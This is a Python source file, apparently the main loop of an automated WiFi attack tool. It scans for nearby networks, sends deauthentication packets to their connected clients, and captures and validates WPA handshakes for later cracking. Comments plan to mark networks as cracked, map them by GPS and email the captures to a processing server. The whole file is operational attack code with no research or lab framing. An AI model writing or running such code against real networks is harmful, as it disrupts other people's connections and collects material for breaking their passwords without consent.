#!/usr/bin/python

import time
import subprocess
import os
import signal
import csv
import xml.etree.cElementTree as ET
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM
from multiprocessing import Process, Pipe
from validate import validator
from scanner import scanner
from watchdog.events import PatternMatchingEventHandler  
from watchdog.observers import Observer
from xml_arse import xml_machine

####improvements:
####
###Add commenting
###
##create temp folders automatically and clean up when finished
#
#Report on make/model of attached clients
#
#Add some verbose debug reporting functionality
#
##Detect interface that is in monitor mode/check
#
##Add args feature to alter things like scan time for initial general scan loop
#
###Working on: method to avoid focus scanning on same network twice, need to
###create new xml file which keeps track of Aps that have been targetted and
###a result; cracked:true/false
#
##instead of "deets" as a list, make it an attribute of self ie self.name or self.BSSID
#and use this instead of deets list....

#Dev null variable for subprocesses
DN = open(os.devnull, 'w')
#wifi interface that is in monitor mode
iface = 'wlan1mon'
#file locations 
##These should be improved to be located in temp files and then cleaned up afterwards
target_dir = '/home/odroid/targets/'
output_dir = '/home/odroid/xmls/'
handshake_dir = '/home/odroid/hs/'
cracked_dir = 'home/odroid/cracked/'

class MyHandler(PatternMatchingEventHandler):
	
	patterns = ["*.xml", "*.netxml"]

##This needs to be improved to tolerate empty/bad xmls...
	def process(self, event):
		#print "Path =", event.src_path					#debug
		#print event.src_path, event.event_type			#debug
		w_xml = xml_machine('%s' % event.src_path)
		crackable_list = w_xml.crackables()
		print "crackable_list:", crackable_list
		if crackable_list == '0':
			print "no luck buddy, keep trying"
		else:
			print "Suitable wireless network(s) detected..."
			for cracker in crackable_list:
				w_xml.parse_deets(cracker)
				if w_xml.name != 'none':
					if w_xml.name != 'petonehappinessclub' and w_xml.name != 'SETUP': 	##ignore this AP
						if w_xml.client_count != 0:
							#print "client_count:", deets["client_count"]   #debug
							w_xml.xml_tree(essid=w_xml.name, 
							channel=w_xml.channel, 
							bssid=w_xml.bssid, 
							packets=w_xml.packets, 
							client_list=w_xml.client_list,
							client_count=w_xml.client_count,)
							w_xml.xml_write(target_dir+cracker+'.xml')

	def on_modified(self, event):
		#print "modified observer =", observer
		#print event.src_path
		#time.sleep(1)
		if os.path.exists(event.src_path):
			self.process(event)

	#def on_created(self, event):
		#print "created observer =", observer
		#print event.src_path
	#	time.sleep(10)
	#	if os.path.exists(event.src_path):
	#		self.process(event)

##This could be made to be WAAAAAAAY more efficient.....
def tidy():
	print "Housekeeping..."
	directory = output_dir
	files_xml = os.listdir(directory)
	print "removing existing xml files:", files_xml
	for file in  files_xml:
		try:
			os.remove(directory+file)        
		except OSError:
			pass
	directory = target_dir
	files_targets = os.listdir(directory)
	for file in files_targets:
		try:
			print "Removing target xml file:", (directory+"/"+file)
			os.remove(directory+"/"+file)   
		except OSError:
			pass
	directory = handshake_dir
	files_handshake = os.listdir(directory)
	print "removing existing handshake files:", files_handshake
	for file in  files_handshake:
		try:
			os.remove(directory+file)        
		except OSError:
			pass

if __name__ == '__main__':
	try:
		while True:
			tidy()
			print "Creating general scanner object"
			g_scanner = scanner(iface)
			#print "g_scanner:", g_scanner					#debug
			print "Creating pipe for general scan"
			airodump_parent_conn, airodump_child_conn = Pipe()
			print "Creating process for general scan"
			airodump = Process(target=g_scanner.scan, kwargs={
			'out_format':'netxml', 
			'out_dest':output_dir, 
			'conn':airodump_child_conn,
			'interval':'20'})
			print  "Creating process for folder watch"
			observer = Observer()
			observer.schedule(MyHandler(), path=output_dir)
			airodump.start()
			scanning = True
			time_started = time.time()
			#print "time_started:%.0f" % time_started			#debug
			print "Starting folder watchdog..."
			observer.start()
			while scanning == True:
				time.sleep(1)
				airodump_parent_conn.send(scanning)
				print "General scan now running for: %.0f seconds" % (time.time() - time_started)
				file_list = os.listdir(target_dir)
				if time.time() - time_started >= 60:
					print "Times up, aborting general scan bitches..."	
					scanning = False
				if file_list != []:
					print "Targets detected, aborting general scan bitches..."
					scanning = False	   
			observer.stop()		
			airodump_parent_conn.send(scanning)
			airodump_parent_conn.close()
			if file_list != []:
#parse xml exported previously with target deets
				for file in file_list:
					#print "target_dir+file:", (target_dir+file) 				#debug
					f_xml = xml_machine(target_dir+file)
					f_xml_deets = f_xml.parse_deets(f_xml.parse_name())
					#print "f_xml.test_cracked:", f_xml.test_cracked()				#debug
#This needs to check someother way for already cracked APs					
					if f_xml.test_cracked() == True:
						print "already cracked AP:", f_xml_deets["essid"]
						break
#start airodump-ng focussed attack using deets parsed from xml
					print "Creating focussed scanner object"
					f_scanner = scanner(iface)
					#print "f_scanner:", f_scanner					#debug
					f_airodump_parent_conn, f_airodump_child_conn = Pipe()
					deauth_parent_conn, deauth_child_conn = Pipe()
					f_airodump = Process(target=f_scanner.scan, kwargs={ 
					'out_format':'pcap', 
					'out_dest':handshake_dir, 
					'channel':f_xml.channel,
					'conn':f_airodump_child_conn,
					'essid':f_xml.name})
					f_deauth = Process(target=f_scanner.deauth, kwargs={ 
					'essid':f_xml.name,
					'bssid':f_xml.bssid,
					'client_MAC':(f_xml.client_list),	#expects a list
					'conn':deauth_child_conn})
#start airodump-ng process - focussed this time
					f_airodump.start()
#start aireply-ng process with deauth method. This could be more refined to focus on loop of listed clients
					f_deauth.start()
					time_started = time.time()
					f_scanning = True
					while f_scanning == True:
						f_airodump_parent_conn.send(f_scanning)
						deauth_parent_conn.send(f_scanning)
##scan pcap file for valid handshake EAPOL packets
						deauth = deauth_parent_conn.recv()
						time.sleep(10)
						if deauth == True:
							files_handshake = os.listdir(handshake_dir)
							for files in files_handshake:		
								handshake_file = (handshake_dir+files)
								if handshake_file == (handshake_dir+f_xml.name+"_scan-01.cap"):     
									valid = validator(SSID=(f_xml.name), 
									BSSID=(f_xml.bssid), 
									capfile=handshake_file)
									print "Validation result of handshake capture:", valid.validation_result
									print "Analysis result of handshake capture:", valid.analyze_result
#when handshake detected stop focussed attack			
									if valid.validation_result or valid.analyze_result == True:			
										print "Handshake captured, my job here is done..."	
##Somehow take note of AP so it doesnt get targetted again. Use essid and MAC to identify the AP
#take GPS position and plot name of wifi network on map
#To be writted here.....
										#for child in f_xml.root.iter('cracked'):	#not needed?
										#	child.text = str(True)					#not needed?
										#	f_xml.xml_write(target_dir+f_xml_deets["essid"]+'.xml')  #not needed?				
										f_scanning = False
										f_airodump_parent_conn.send(f_scanning)
										deauth_parent_conn.send(f_scanning)
										f_airodump_parent_conn.close()
										deauth_parent_conn.close()
										time.sleep(1)
#process handshake file here: strip, analyze and validate	
										print "Stripping handshake cap file of unnecessary packets"
										valid.strip(handshake_dir+valid.SSID+'_strip.cap')
										print "Vaidating stripped cap file..."
										strip_valid = validator(SSID=(f_xml.name), 
										BSSID=(f_xml.bssid), 
										capfile=handshake_dir+valid.SSID+'_strip.cap')
										print "Validation result of stripped handshake capture:", strip_valid.validation_result
										print "Analysis result of stripped handshake capture:", strip_valid.analyze_result
										break
#time-out in case no handshakes are captured
##make this option (length in seconds) controllable via args???			
						print "Focussed attack now running for: %.0f seconds" % (time.time() - time_started)
						if time.time() - time_started >= 60:
							print "Times up, aborting focussed attack..."	
							f_scanning = False
							f_airodump_parent_conn.send(f_scanning)
							deauth_parent_conn.send(f_scanning)
							f_airodump_parent_conn.close()
							deauth_parent_conn.close()
							#for child in f_xml.root.iter('cracked'):			#not needed?
							#	child.text = str(True)							#not needed?
							#	f_xml.xml_write(target_dir+f_xml_deets["essid"]+'.xml')	#not needed?
							break	
			else:
				print "No suitable networks detected."
			time.sleep(2)
			print "up to here..."	
	except KeyboardInterrupt:
		print "manually interrupted!"
#export processed handshake file and email to processing server
#return to top of loop and continue scanning...